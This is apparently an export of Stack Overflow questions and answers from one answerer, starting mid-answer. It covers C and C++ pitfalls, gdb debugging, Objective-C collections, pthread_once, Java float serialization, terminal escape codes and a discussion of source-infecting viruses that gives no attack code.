<p><code>pthread_once_t</code> is a control for executing a function only once with <a href=""https://computing.llnl.gov/tutorials/pthreads/man/pthread_once.txt"" rel=""nofollow""><code>pthread_once</code></a>.  Suppose you have to call an initialization routine, but you must only call that routine once.  Furthermore, the point at which you must call it is after you've already started up multiple threads.  One way to do this would be to use <code>pthread_once()</code>, which guarantees that your routine will only be called once, no matter how many threads try to call it at once, so long as you use the same control variable in each call.  It's often easier to use <code>pthread_once()</code> than it is to use other alternatives.</p>
"
"<p>Wolfram Research has had the same documentation for this function for the last 8 years at least:</p>

<pre><code>Thread[f[args]]
</code></pre>

<p>""threads"" f over any lists that appear in args.</p>

<p>A lovely circular definition if I've ever seen one.</p>

<p>Does anyone know what the actual semantics are and can provide a proper explanation that is non-circular?</p>
","9530","","<p>It works similarly to Python's <a href=""http://docs.python.org/library/functions.html#zip""><code>zip()</code></a> function, but in a slightly more general fashion.  For example:</p>

<pre><code>In[1] := Thread[{{1, 2, 3}, {4, 5, 6}}]  (* f == List *)
Out[1] = {{1, 4}, {2, 5}, {3, 6}}

In[2] := Thread[f[{1, 2, 3}, {4, 5, 6}]]
Out[2] = {f[1, 4], f[2, 5], f[3, 6]}

In[3] := Thread[f[a+b+c, d+e+f], Plus]
Out[3] = f[a, d] + f[b, e] + f[c, f]
</code></pre>
"
"<p>I need to serialize a java Float to be read by an application written in C++ over Socket comms. Is there a standard for this? It would be easiest to use the method floatToIntBits in the Float Class, however I am not sure how standard that is.</p>
","9530","","<p>Use <a href=""http://java.sun.com/javase/6/docs/api/java/lang/Float.html#floatToIntBits%28float%29"" rel=""nofollow""><code>Float.floatToIntBits()</code></a> (or <code>Float.floatToRawIntBits()</code> if you want to preserve NaN values) to convert the float to an integer.  <code>floatToIntBits()</code> is specified to return the integer in IEEE 754 format, which is the format used by virtually all C/C++ implementations.  You should then convert the integer into a byte array in network byte order (big-endian), which you can then safely serialize to a file, socket, byte stream, etc.:</p>

<pre><code>int floatBits = Float.floatToIntBits(myFloat);
byte floatBytes[] = new byte[4];
floatBytes[0] = (byte)(floatBits &gt;&gt; 24);
floatBytes[1] = (byte)(floatBits &gt;&gt; 16);
floatBytes[2] = (byte)(floatBits &gt;&gt; 8);
floatBytes[3] = (byte)(floatBits);
</code></pre>
"
"<p>I'm beginning to write me some Common Lisp and am just getting the hang of consing things together and formatting them.</p>

<p>Let's suppose I have an alist, like this:</p>

<pre><code>(defvar *map* '((0 . ""zero"") (1 . ""one"") (2 . ""two"")))
</code></pre>

<p>How do I format it like this?</p>

<pre><code>0: zero
1: one
2: two
</code></pre>

<p>I was thinking something like <code>(format t ""~{~{~a: ~a~}~%~}"" *map*)</code>, but that gives an error because ""zero"" isn't a list and you can't take the car of it.</p>

<p>Of course, doing <code>(format t ""~{~a~%~}"" *map*)</code> prints</p>

<pre><code>(0 . ""zero"")
(1 . ""one"")
(2 . ""two"")
</code></pre>

<p>like it's supposed to, but it's not quite what I want. Is there a better way to do this than just <code>(dolist (entry *mapping*) (format t ""~a: ~a~%"" (car entry) (cdr entry)))</code>?</p>
","9530","","<p>I don't think there's a better way to do it; I would used <code>map()</code>:</p>

<pre><code>(format t ""~{~a~%~}""
  (map 'list
    #'(lambda (entry)
      (format nil ""~a: ~a"" (car entry) (cdr entry))
    *map*))
</code></pre>
"
"<p>i wish to generate two opposing tone one in the right stereo channel and one in the left stereo channel  both at different frequencies i wish to accomplish this in c or objective c</p>
","9530","","<p>You can easily generate the tone with a sine wave: the <em>n</em>th sample is given by <code>A*sin(2*pi*n*f/R)</code>, where A is the amplitude (volume), <code>f</code> is the frequency in Hertz, and <code>R</code> is the sample rate in samples per second.  For stereo sound, you generate two independent waves with different parameters.</p>

<p>The hard part is actually playing the sound.  You'll have to use some sort of platform-specific audio library, or a third-party library that abstracts away the platform-specific details.  Alternatively, you could just write out the sound data to a WAV file, which is not terribly difficult, since WAV files are just raw, uncompressed PCM data with a RIFF header.</p>
"
"<p>If I have a prototype that looks like this:</p>

<pre><code>function(float,float,float,float)
</code></pre>

<p>I can pass values like this:</p>

<pre><code>function(1,2,3,4);
</code></pre>

<p>So if my prototype is this:</p>

<pre><code>function(float*);
</code></pre>

<p>Is there any way I can achieve something like this?</p>

<pre><code>function( {1,2,3,4} );
</code></pre>

<p>Just looking for a lazy way to do this without creating a temporary variable, but I can't seem to nail the syntax.</p>
","9530","","<p>You can do it in C99 (but <em>not</em> ANSI C (C90) or any current variant of C++) with <em>compound literals</em>.  See section 6.5.2.5 of the C99 standard for the gory details.  Here's an example:</p>

<pre><code>// f is a static array of at least 4 floats
void foo(float f[static 4])
{
   ...
}

int main(void)
{
    foo((float[4]){1.0f, 2.0f, 3.0f, 4.0f});  // OK
    foo((float[5]){1.0f, 2.0f, 3.0f, 4.0f, 5.0f});  // also OK, fifth element is ignored
    foo((float[3]){1.0f, 2.0f, 3.0f});  // error, although the GCC doesn't complain
    return 0;
}
</code></pre>

<p>GCC also provides this as an extension to C90.  If you compile with <code>-std=gnu90</code> (the default), <code>-std=c99</code>, or <code>-std=gnu99</code>, it will compile; if you compile with <code>-std=c90</code>, it will not.</p>
"
"<p>I want to use rb_p() to aid in debugging a ruby C extension, but everytime i use it i get a SIGTRAP in gdb!</p>

<p>here's an example:</p>

<p>(gdb) p user_defaults</p>

<p>$3 = 137559900</p>

<p>(gdb) call rb_p(user_defaults)</p>

<p>{:fill=>true, :texture=>#}</p>

<p>(gdb) n</p>

<p>Program received signal SIGTRAP, Trace/breakpoint trap.
is_a_hash (try_hash=137560420) at utils.c:65
(gdb) </p>

<p>why does this happen? how can i stop it happening??</p>
","9530","","<p>SIGTRAP is caused by a breakpoint exception, specifically by the <code>int3</code> instruction on x86 (interrupt 3).  Your code is probably executing an <code>int3</code>.  Take a look where gdb is telling you -- at <code>utils.c</code> line 65 in the <code>is_a_hash()</code> function.  If you don't have access to the source code, you can at least get the disassembly from gdb by typing</p>

<pre><code>disas try_hash
</code></pre>

<p>at the gdb prompt.</p>
"
"<p>sometimes i want to debug functions like this: my_func1(my_func2(my_func3(val)));</p>

<p>is there a way i can step through this nested call in gdb? I want to step through my_func3, then my_func2, then my_func1 etc</p>
","9530","","<p>Yes, although you may have get your hands dirty with the disassembly.  First try the <code>step</code> command (abbreviation <code>s</code>).  If that doesn't put you into <code>my_func3()</code>, try instead the <code>stepi</code> command (abbreviation <code>si</code>) to step one instruction at a time.  This may take several invocations, since there can be a lot of instructions setting up the function call arguments and cleaning up afterwards.</p>
"
"<p>I am using inotify with ""interupt io"" by setting the O_ASYNC flag on the
inotify file descriptor and then using fcntl(inotifyfd, F_SETOWN, getpid())
coupled with a signal(sighandler, SIGIO) call, all from a single process,
in order to set up an inotify file descriptor event handler.</p>

<p>The idea is to  have inotify's file descriptor generate the SIGIO signal (via the O_ASYNC  flag set) and have teh signal(..) registered handler handle the SIGIO signals
as they are emitted thus avoiding polling the inotify file descriptor.</p>

<p>After the initial setup and signal handler setting the process has nothing to do
and would normally exit.</p>

<p>I need the same process to remain idle after the setup as it acts as a daemon awaiting the SIGIO signals. This is where I am looking for help.</p>

<p>How can I idle the process to take the very least amount of cpu resources?</p>
","9530","","<p>One easy way is to just <a href=""http://linux.die.net/man/3/sleep"" rel=""nofollow""><code>sleep(3)</code></a> for a very large amount of time.  Since signals wake up the process, you need to put the sleep in a loop:</p>

<pre><code>while(1)
    sleep(1000);
</code></pre>

<p>The more correct way is probably to use <a href=""http://linux.die.net/man/2/sigsuspend"" rel=""nofollow""><code>sigsuspend(2)</code></a>:</p>

<pre><code>sigsuspend(NULL);
</code></pre>
"
"<p>Today I had a strange encounter with gcc. consider the following code:</p>

<pre><code>float len[ELEM+1];
len[1]=1.0; len[2]=2.0; len[3]=3.0;                                 //length

nod[1][1] = 1;
nod[1][2] = 2;
nod[2][1] = 2;
nod[2][2] = 3;
nod[3][1] = 3;
nod[3][2] = 4;                //CONNECTIVITY


for(i=1;i&lt;nnod;i++)
  for(j=1;j&lt;nfree;j++)
/* blah blah.........*/
</code></pre>

<p><strong>And a variation:</strong></p>

<pre><code>float len[ELEM+1];
len[1]=1.0; len[2]=2.0; len[3]=3.0;                                 //length

nod[1][1] = 1;
nod[1][2] = 2;
nod[2][1] = 2;
nod[2][2] = 3;
nod[3][1] = 3;
nod[3][2] = 4;                //CONNECTIVITY
</code></pre>

<p><strong>len[1]=1.0; len[2]=2.0;</strong></p>

<pre><code>for(i=1;i&lt;=nnod;i++)
  for(j=1;j&lt;=nfree;j++)
/* blah blah.........*/
</code></pre>

<p>The only difference is highlighted in bold.The problem is this:
When length is later printed, the first code prints len[1] and len[2] (and uses them in expressions) as 0.0000 while the second code is printing and using the correct values of those variables.</p>

<p><strong>What's wrong? I'm utterly confused.:-o</strong></p>

<p><em>Note: len is not modified anywhere else.</em></p>
","9530","","<p>You can try setting a <a href=""http://sourceware.org/gdb/current/onlinedocs/gdb%5F6.html#SEC35"" rel=""nofollow""><em>watchpoint</em></a> in gdb to see when <code>len</code> is being modified.  Make sure to compile your program with debug information (<code>-g</code>) and no optimization (<code>-O0</code>).  Then, set a breakpoint near the declaration of <code>len</code>, add a watchpoint with <code>watch len[0]</code>, and run.  gdb will break whenever <code>len[0]</code> is modified, and it will tell you the new and the old value.</p>
"
"<p>I know dictionaries as something where you need a key in order to get a value. But how can I iterate over all keys and values in a dictionary, so that I know what keys there are, and what values there are? I know there is something called a <em>for-in-loop</em> in JavaScript. Is there something similar in Objective-C?</p>
","9530","","<p>Yes, <code>NSDictionary</code> supports fast enumeration. With Objective-C 2.0, you can do this:</p>

<pre><code>// To print out all key-value pairs in the NSDictionary myDict
for(id key in myDict)
    NSLog(@""key=%@ value=%@"", key, [myDict objectForKey:key]);
</code></pre>

<p>The alternate method (which you have to use if you're targeting Mac OS X pre-10.5, but you can still use on 10.5 and iPhone) is to use an <code>NSEnumerator</code>:</p>

<pre><code>NSEnumerator *enumerator = [myDict keyEnumerator];
id key;
// extra parens to suppress warning about using = instead of ==
while((key = [enumerator nextObject]))
    NSLog(@""key=%@ value=%@"", key, [myDict objectForKey:key]);
</code></pre>
"
"<p>Let's say there is a simple test code</p>

<pre><code>typedef struct
{
    int first;
    int second;
    int third;
} type_t;

#define ADDRESS 0x12345678

#define REGISTER ((type_t*)ADDRESS)

const int data = (int)(&amp;REGISTER-&gt;second)*2;

int main(void)
{
    volatile int data_copy;

    data_copy = data;

    while(1) {};
}
</code></pre>

<p>Which is compiled in CodeSourcery G++ (gcc 4.3.2) for bare metal ARM. It also has a very standard linker script.</p>

<p>When compiled in C (as main.c) the object ""data"" goes into Flash, as expected. When compiled in C++ (as main.cpp) this object goes into RAM, and additional code is added which does nothing more than copy the value from Flash to RAM (the value is already calculated, just copy!). So the compiler can calculate the address, but somehow doesn't want to ""just
use it"". The root of the problem is the multiplication of the address - without ""*2"" multiplication both versions work as expected - ""data"" is placed in Flash. Also - when ""data"" is declared as:</p>

<pre><code>const int data = (int)(REGISTER)*2;
</code></pre>

<p>also everything is fine.</p>

<p>All files for C and C++ compilation are identical, the only difference is the call to compiler - g++ for main.cpp, gcc for main.c (with differences in the level of warnings, and c++ has RTTI and exceptions disabled).</p>

<p>Is there any easy and elegant way to overcome this ""C++ problem""? I do require such operations for creating const arrays of addresses of bits in bitband region of Cortex-M3. Is this a bug, or maybe that is some strange limitation of the C++ compiler?</p>

<p>I know that I can create data objects in ""C"" files and just ""extern""-include them in C++, but that's not very elegant [;</p>

<p>Thank you for all help!</p>
","9530","","<p>You have several problems.  Why are you taking an address, converting it to an integer, and multiplying by 2?  You should never by multiplying addresses, or storing addresses as ints.  The only arithmetic you should ever do with pointers is to subtract them (to obtain an offset), or to add a pointer with an offset to get another pointer.</p>

<p>In C++, the rules for global value initialization are a little more lax than in C.  In C, values are required to be initialized to compile-time constants; as a result, the compiler can place <code>const</code> global values in read-only memory.  In C++, values can be initialized to expressions which aren't necessarily compile-time constants, and the compiler is permitted to generate code at runtime to calculate the initial value.  This initialization code is called before entry into <code>main()</code>, akin to constructors for global objects.</p>

<p>Since you're working with constants addresses, and you know how big an <code>int</code> is on your platform (I'm assuming 32 bits), you should just do something like this:</p>

<p>Next, your use of the <code>volatile</code> keyword is completely wrong.  <code>volatile</code> says to the compiler not to save a variable in a register -- it should be reloaded from memory each time it is read, and it should be fully written to memory every time it is written.  Declaring the local variable <code>data_copy</code> as <code>volatile</code> is practically useless, unless you expect another thread or a signal handler to start modifying it unexpectedly (highly doubtful).  Further, <code>data_copy</code> is just a copy of the address, not the contents of the register you're trying to read.</p>

<p>What you <em>should</em> be doing is declaring <code>REGISTER</code> as a pointer to a volatile -- that is one of the express purposes of <code>volatile</code>, for accessing memory-mapped registers.  Here's what your code should look like:</p>

<pre><code>#define REGISTER (*(volatile type_t *)ADDRESS)
#define DATA (*(const volatile int *)((ADDRESS+4)*2))
</code></pre>

<p>This makes it so that when you do things like this:</p>

<pre><code>REGISTER.first = 1;
REGISTER.first = 2;
int x = REGISTER.second;
int y = DATA;
</code></pre>

<p>It always does the proper thing: a write of 1 to 0x12345678, a write of 2 to 0x12345678, a read from 0x1234567c, and a read from 0x2468acf8.  The <code>volatile</code> keyword ensures that those reads and writes always happen, and they don't get optimized away: the compiler will not remove the first write to <code>REGISTER.first</code>, which would be redundant if it were a regular variable.</p>

<p><strong>EDIT</strong></p>

<p>In response to your comment, see Andrew Medico's response to your comment -- you're really multiplying the <em>difference</em> between two pointers by 2, which is ok.  Just be careful about your data types.  I also never mentioned anything about a kernel.</p>

<p>You can get gcc to put variables in a specific data section with the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html#index-g%5Ft%5F0040code%5F007bsection%5F007d-variable-attribute-2413"" rel=""nofollow""><code>section</code> attribute</a>:</p>

<pre><code>const volatile int *data __attribute__((section(""FLASH"")) = /* whatever */;
</code></pre>

<p>Use the proper section name.  If you're not sure what that is, take the object file generated by the C compiler (which you said puts it in the proper section), run <code>nm</code> on it, and see what section the C compiler put it in.</p>
"
"<p>I'm new to Objective-C and working in GNUstep and MinGW environment. I am compiling this code but having an error:</p>

<pre><code>#import ""Foundation/Foundation.h""

@interface C : NSObject
{
    float f;
}

- (void) gamerHell: (NSString *) name : (NSString *) lastName ;

@end

@implementation C

- (void) gamerHell: (NSString *) firstName : (NSString *) lastName {

    NSLog(@""Welcome, %s %s"",firstName,lastName);
}

@end

int main(int argc , const char * argv[]){

    NSAutoReleasePool * pool = [[NSAutoReleasePool alloc] init];

    C *ob = [[C alloc] init];
    [ob gamerHell: @""SHAN"" : @""UL HAQ""];

    [ob release];

    [pool drain];
    return 0;
}
</code></pre>

<p>It is giving a compile-time error like this:</p>

<blockquote>
  <p>'NSAutoReleasePool' is undeclared (first use in this function)</p>
</blockquote>

<p>What should I do to overcome this error?</p>
","9530","","<p>Try using <code>NSAutoreleasePool</code> instead of <code>NSAutoReleasePool</code> (with a lowercase <code>r</code>).</p>
"
"<p><strong>How can you count the number of the character <code>&lt;</code> in your files?</strong></p>

<p>I am trying to count the number of the character ""&lt;"" in my files, similarly as in Vim by</p>

<pre><code>%s/&lt;//gn
</code></pre>

<p>I run</p>

<pre><code> find * -type f | xargs sed 's/&lt;//gn'
</code></pre>

<p>I get</p>

<pre><code>sed: -e expression #1, char 7: unknown option to `s'
</code></pre>

<p>This error suggests me that Vim's :s -mode is not like SED.</p>
","9530","","<p>I'm not familiar with the <code>n</code> option in Vim, but yes, sed does not support the <code>n</code> option.  Here's another way you could count the number of instances of the <code>&lt;</code> character in your files:</p>

<pre><code>find * -type f | xargs cat | tr -d -c '&lt;' | wc -c
</code></pre>

<p>The <code>tr -d -c '&lt;'</code> command deletes all characters that are not <code>&lt;</code>, and then <code>wc -c</code> counts the number of remaining characters.</p>
"
"<p>I am starting to learn ocaml, and am really appreciating the power of recursion in the language.  However, one thing that I am worried about is stack overflows.</p>

<p>If ocaml uses the stack for function calls, won't it eventually overflow the stack?  For example, if I have the following function:</p>

<pre><code>let rec sum x =
  if x &gt; 1 then f(x - 1) + x
  else x;;
</code></pre>

<p>it must eventually cause a stack-overflow.  If I was to do the equivalent thing in c++ (using recursion), I know that it would overflow.</p>

<p>So my question is, is there built in safeguards to prevent functional languages from overflowing the stack?  If not, are they not less useful like this, since the above summing algorithm, written in a procedural style with a for loop, could handle any number (dis-regarding integer overflow)?</p>
","9530","","<p>Some functional languages such as Scheme specify that <a href=""http://en.wikipedia.org/wiki/Tail%5Frecursion"" rel=""nofollow"">tail recursion</a> <strong>must</strong> be optimized to be equivalent to iteration; hence, a tail-recursive function in Scheme will never result in a stack overflow, no matter how many times it recurses (presuming, of course, that it doesn't also recurse or engage in mutual recursion in other places besides the end).</p>

<p>Most other functional languages don't require tail recursion to be implemented efficiently; some choose to do so, others do not, but it's relatively easy to implement, so I would expect that most implementations do so.</p>
"
"<p>I mean: Is the order of keys and values in an NSDictionary always the same like how they were specified when initializing the NSDictionary? Or should I better maintain a seperate NSArray if I really need to know the order of keys?</p>
","9530","","<p>No, they are not ordered.  As long as you don't add or remove any elements from the dictionary, they will remain in the same order, but as soon as you add or remove an element, the new order will be completely different.</p>

<p>If you need the keys/values to be ordered, use an NSArray (or some other ordered data structure) instead.</p>
"
"<p>I'm debugging a C++ Win32 application and I'd like to call an arbitrary Win32 API from the context of that process, as though the program had run this line of code:</p>

<pre><code>DestroyWindow(0x00021c0e);
</code></pre>

<p>But entering that into the Immediate Window gives:</p>

<pre><code>CXX0017: Error: symbol ""DestroyWindow"" not found
</code></pre>

<p><strong>Edit:</strong> Using the full name of the function, <code>{,,user32.dll}_NtUserDestroyWindow@4</code>, I can get the Immediate Window to understand which function I mean and display the function's address:</p>

<pre><code>{,,user32.dll}_NtUserDestroyWindow@4
0x76600454 _NtUserDestroyWindow@4
</code></pre>

<p>but when I try to call it, this happens:</p>

<pre><code>{,,user32.dll}_NtUserDestroyWindow@4(0x00021c0e);
CXX0004: Error: syntax error
</code></pre>

<p>Is it even possible to call a C function from the Immediate Window like this, or am I barking up the wrong tree?</p>
","9530","","<p>Once you have the function address (as you've done in the updated question), you can try casting it to a function pointer and calling it:</p>

<pre><code>(*(BOOL (*)(HWND))0x76600454)((HWND)0x00021c0e)
</code></pre>

<p>The first part of that casts the address to <code>BOOL (*)(HWND)</code>, which is a pointer to a function taking an <code>HWND</code> parameter and returning <code>BOOL</code>.  Then, the function pointer is dereferenced and called.  Make sure to get the parameters correct, otherwise bad things will happen.  On 64-bit systems, and <code>HWND</code> might be 64 bits, so you might not be able to get away with passing the parameter as an <code>int</code>.</p>

<p><strong>Edit:</strong> See the comments for the full story.</p>
"
"<p>I see here:</p>

<p><a href=""http://www.pgrs.net/2008/1/11/command-line-clipboard-access"">http://www.pgrs.net/2008/1/11/command-line-clipboard-access</a></p>

<p>that there's a way in linux and osx to copy to the clipboard from the command line.  So I ran my cygwin setup.exe, but couldn't find the xsel package.  I'm guessing maybe this package hasn't been ported to windows?  Looks like there's a tool to do it in windows:</p>

<p><a href=""http://www.labnol.org/software/tutorials/copy-dos-command-line-output-clipboard-clip-exe/2506/"">http://www.labnol.org/software/tutorials/copy-dos-command-line-output-clipboard-clip-exe/2506/</a></p>

<p>I guess I'll try that - but in the mean I figured I'd ask if anyone has found a good solution.</p>
","9530","","<p>Cygwin comes with special device file called <a href=""http://williammitchell.blogspot.com/2008/03/fun-with-cygwins-devclipboard.html""><code>/dev/clipboard</code></a>:</p>

<pre><code>echo foobar &gt; /dev/clipboard  # Puts ""foobar\n"" on the clipboard
cat /dev/clipboard  # Pastes clipboard to stdout
</code></pre>
"
"<p>I want to write a function(say foo) which takes string as an argument and returns a function pointer ,however this pointer points to following function:</p>

<p>DWORD WINAPI fThread1(LPVOID lparam)</p>

<p>Also the function(foo) is member of a class so i will be  defining  it and declaring it in  seperate files(header and .cpp files).
Please help me with the declaration syntax.</p>

<p>Thanks and Regards</p>
","9530","","<p>The easiest way is to use a typedef for the function pointer:</p>

<pre><code>typedef DWORD (WINAPI *ThreadProc)(LPVOID);

class MyClass
{
public:
    ThreadProc foo(const std::string &amp; x);
};
...
ThreadProc MyClass::foo(const std::string &amp; x)
{
    // return a pointer to an appropriate function
}
</code></pre>

<p>Alternatively, if you don't want to use a typedef for some reason, you can do this:</p>

<pre><code>class MyClass
{
public:
    DWORD (WINAPI *foo(const std::string &amp; x))(LPVOID);
};
...
DWORD (WINAPI *MyClass::foo(const std::string &amp; x))(LPVOID)
{
    // return a pointer to an appropriate function
}
</code></pre>

<p>The syntax is rather ugly, so I highly recommend using a typedef.</p>
"
"<p>I'm interested in clearing the output of a C program produced with printf statements, multiple lines long.</p>

<p>My initial guess was to use </p>

<pre><code> printf(""output1\n"");
 printf(""output2\n"");
 rewind(stdout);
 printf(""output3\n"");
 printf(""output4\n"");
</code></pre>

<p>but this produces</p>

<pre><code> output1
 output2
 output3
 output4
</code></pre>

<p>I was hoping it would produce</p>

<pre><code> output3
 output4
</code></pre>

<p>Does anyone know how to get the latter result?</p>
","9530","","<p>Most terminals support <a href=""http://en.wikipedia.org/wiki/ANSI%5Fescape%5Fcode"">ANSI escape codes</a>.  You can use a J (with parameter 2) to clear the screen and an H (with parameters 1,1) to reset the cursor to the top-left:</p>

<pre><code>printf(""\033[2J\033[1;1H"");
</code></pre>

<p>Alternatively, a more portable solution would be to use a library such as <a href=""http://www.gnu.org/software/ncurses/"">ncurses</a>, which abstracts away the terminal-specific details.</p>
"
"<p>Is that generally possible? Is the console able to format a link so that it is clickable? i.e. a link that launches an application, or anything else when clicked?</p>
","9530","","<p>No, not unless your terminal supports it, and most terminals I know of don't support such a feature.  If your terminal <em>does</em> support hyperlinks, read up on its documentation -- there's probably some escape sequence analogous to <a href=""http://en.wikipedia.org/wiki/ANSI%5Fescape%5Fcode"" rel=""nofollow"">ANSI escape codes</a> for doing so.</p>
"
"<p><strong>BE AWARE! Creating spyware, computer viruses and similar nasties can be illegal where you live and is considered extremely unethical by almost everyone.</strong> Still, I need to ask this to raise awareness about how easy it is to create one. I am asking this after the W32/Induc-A was introduced to this world by someone who came up with a nasty way to spread one. So I want to know how a virus can be created so I will be able to recognise them in the future!</p>

<p><strong>Recently a <a href=""http://edn.embarcadero.com/article/39851"" rel=""nofollow"">new virus</a> was discovered which spreads itself by replacing the developers' copies of library code.</strong> Actually, through the source code of Delphi 4 through 7. What happened is that there's a virus in the wild which searches the computer for a file called SYSCONST.PAS, to which it will add itself as source code. This file happens to be a source file for the runtime libraries of Delphi. (This runtime source code is available for Delphi developers.) As a result, after being infected a programmer would create lots of new versions of this virus without even knowing it. Since virus scanners sometimes generate false positives many developers might thus decide to ignore the warnings of the scanner and maybe they'll even disable their scanner while building their project. To make it worse, their project might even trigger the scanners of their customers so it's likely that those programmers won't check their source code but will just try to fool the scanner somehow. That is, if a virus scanner is even able to recognise the virus, which isn't very likely. <strong>Thus, we software developers might be creating viruses without realizing what we're doing!</strong></p>

<p>So, how to create a virus? Simple: get your source code infected by a virus and you're done!</p>

<p>Okay, so the source code of Delphi 4 through 7 might be infected. All Delphi developers, please check your source files! The case is just a proof-of-concept and apparently it can be very successful. Besides, most virus scanners won't check source code but just focus on executables. This virus could stay undetected for quite a while.</p>

<p><strong>This virus also was successful because it misused source code.</strong> Delphi is a commercial project and the source code is available. But who is sure that these hackers won't be attacking open-source projects in similar ways? There are lots of open-source projects out there and who is going to check them all making sure they're all behaving in a decent way? And if someone is checking the code, will he be able to recognise if something is malicious code?</p>

<p><strong>So, to make sure we can recognize malicious source code, I have to ask:</strong> How do I create a virus? How do I recognise the code that will create a virus? What is it that most malware will want to do?
<hr />There is a bit of discussion about the Delphi runtime source code, about this code being open-source or not. Borland uses a dual-license for their source code from the moment when they started to support Linux with Kylix. As a result, the source code has a ""GPL"" symbol declared which indicates if the libraries are compiled as GPL code or not. As GPL, the source code would be open-source. This also happens to be the source version that was attacked by the virus. Anyway, to avoid discussions here, I've asked <a href=""http://stackoverflow.com/questions/1388114/is-the-delphi-runtime-code-open-source-or-not"">this question here</a> so we can focus more on the virus problem and less on Delphi. Basically, we're talking about a virus that attacks source code. Technically, all source code could be at risk but open source code is a likely candidate since hackers know it's structure and can target those files that are rarely modified, thus rarely checked. (And if they can hack their way into a CVS system, they could even erase the traces of their modifications, thus no one might notice the modiifications!)</p>
","9530","","<p>While this does not really answer your question, I think a really interesting paper to read is <a href=""http://www.google.com/url?sa=t&amp;source=web&amp;ct=res&amp;cd=2&amp;url=http%3A%2F%2Fwww.ece.cmu.edu%2F~ganger%2F712.fall02%2Fpapers%2Fp761-thompson.pdf&amp;ei=MQKkSvXfHdOc8Qa65JnyDw&amp;usg=AFQjCNHEfcr3nqaWB49hKiQMr8soeNbbkA&amp;sig2=RSV3Avxxn6ymDFGYGLbzZA"">Reflections on Trusting Trust</a> by Ken Thompson.  It raises a fascinating point that <em>even if your source code is free of defects (viruses, trojans, etc.), you might still be producing defective executables if your compiler is defective</em>.  And even if you rebuild the compiler from clean source code, you can still have the same problem.</p>

<p>Unless you're building your computer from the ground up with your own microchips, hand-assembling your own BIOS, writing your own operating system, compiler, and software, you have to draw the line somewhere and <em>trust</em> that the hardware and software upon which you're building your systems are correct.</p>
"
"<p>I have three button named(titled) hello, nothing, heaven and one label (IBOutlet UIlabel lab). I want to display three diff messages for three diff button click. But the following code failed to accomplish this. Can anyone suggest any idea?</p>

<pre><code>-(IBAction)buttonclick:(id)sender  
{  

    NSString *title=[sender titleForState:UIControlStateNormal];

    if([title isEqualToString:@""hello""])
    {

        NSString *str=[[NSString alloc] initWithFormat:@""abc""];
    }
    else if([title isEqualToString:@""nothing""]) {

        NSString *str=[[NSString alloc] initWithFormat:@""def""];
    }
    else if([title isEqualToString:@""heaven""])
    {

        NSString *str=[[NSString alloc] initWithFormat:@""ijk""];
    }   

    lab.text=str;
    [str release];
}
</code></pre>

<p>output:  </p>

<pre><code>warning:unused variable str;
</code></pre>
","9530","","<p>The problem is that in each 'then' clause of the various <code>if</code> statements, you're creating a new local variable named <code>str</code>, assigning it to a new string, and then the variable goes out of scope.  The compiler warning should tick you off to this: you're writing to a variable but never reading from it.</p>

<p>Ordinarily, your code wouldn't compile, but you apparently have another variable named <code>str</code> in scope later on.  Your new definitions of <code>str</code> are <em>shadowing</em> the old one: while the new name <code>str</code> is in scope, the name <code>str</code> refers to that variable, not the outer one, and the outer one is cannot be referred to.</p>

<p>The solution is to move the declaration of <code>str</code> up to the top of the function.  Furthermore, it's simpler just to use <code>[NSString stringWithFormat:@""blah""]</code> instead of <code>[[NSString alloc] initWithFormat:@""blah""]</code>, since the former gives you an autoreleased object.  This saves you from having to manually <code>release</code> it later on.  Note that assigning <code>lab.text=str</code> retains it, since the <code>text</code> property of the <code>UILabel</code> class has the <code>retain</code> modifier.</p>

<pre><code>-(IBAction)buttonclick:(id)sender  
{  
    NSString *title=[sender titleForState:UIControlStateNormal];
    NSString *str;

    if([title isEqualToString:@""hello""])
    {
        str=[NSString stringWithFormat:@""abc""];
    }
    else if([title isEqualToString:@""nothing""])
    {
        str=[NSString stringWithFormat:@""def""];
    }
    else if([title isEqualToString:@""heaven""])
    {
        str=[NSString stringWithFormat:@""ijk""];
    }

    lab.text=str;
}
</code></pre>

<p>Also note that with your original code, you had both a memory leak and memory corruption -- since you were allocating a string and then losing a reference to it (by the new local variable <code>str</code> going out of scope) without releasing it, and then you were calling <code>release</code> an extra time on whatever the outer <code>str</code> variable was.  Moving the <code>str</code> declaration to the top of the function fixes both problems.</p>

<p>I'm also assuming that your format strings are more complicated than just plain strings.  If you're actually assigning constant strings such as <code>""abc""</code>, then of course it's much simpler to just do <code>str=@""abc""</code> instead of <code>str=[NSString stringWithFormat:@""abc""]</code>.</p>
"
"<p>I came across the following code that compiles fine (using Visual Studio 2005):</p>

<pre><code>SomeObject SomeClass::getSomeThing()
{
    for each (SomeObject something in someMemberCollection)
    {
        if ( something.data == 0 )
        {
            return something;
        }
    }
    // No return statement here
}
</code></pre>

<p>Why does this compile if there is no return statement at the end of the method?</p>
","9530","","<p>It's possible to write code that is guaranteed to always return a value, but the compiler might not be able to figure that out.  One trivial example would be:</p>

<pre><code>int func(int x)
{
    if(x &gt; 0)
        return 1;
    else if(x == 0)
        return 0;
    else if(x &lt; 0)
        return -1;
}
</code></pre>

<p>As far as the compiler is concerned, it's possible that all 3 <code>if</code> statements evaluate to <code>false</code>, in which case control would fall off the end of the function, returning an undefined result.  Mathematically, though, we know it's impossible for that to happen, so this function has defined behavior.</p>

<p>Yes, a smarter compiler might be able to figure this out, but imagine that of integer comparisons, we had calls to external functions defined in a separate translation unit.  Then, as humans we can prove that all control paths return values, but the compiler certainly can't figure that out.</p>

<p>The reason this is allowed is for compatibility with C, and the reason that C allows it is for compatibility with legacy C code that was written before C was standardized (pre-ANSI).  There was code that did exactly this, so to allow such code to remain valid and error-free, the C standard permitted this.  Letting control fall off a function without returning a value is still undefined behavior, though.</p>

<p>Any decent compiler should provide a warning about this; depending on your compiler, you may have to turn your warning level way up.  I believe the option for this warning with gcc is <code>-Wextra</code>, which also includes a bunch of other warnings.</p>
"
"<p>I was asked a very interesting question during a C interview: How can you implement a function f() in such a way that it can only be called from a particular g() function. If a function other than g() tries to call f() it would result in a compiler error.</p>

<p>At first, I though this could be done with function pointers and I could get close to blocking the call at runtime. But I was not able to think of a compile time strategy. I don't even know if this is possible using ansi C.</p>

<p>Does anyone have any idea?</p>
","9530","","<p>You can make module-private functions with the <code>static</code> keyword:</p>

<pre><code>static void func(void)
{
    // ...
}
</code></pre>

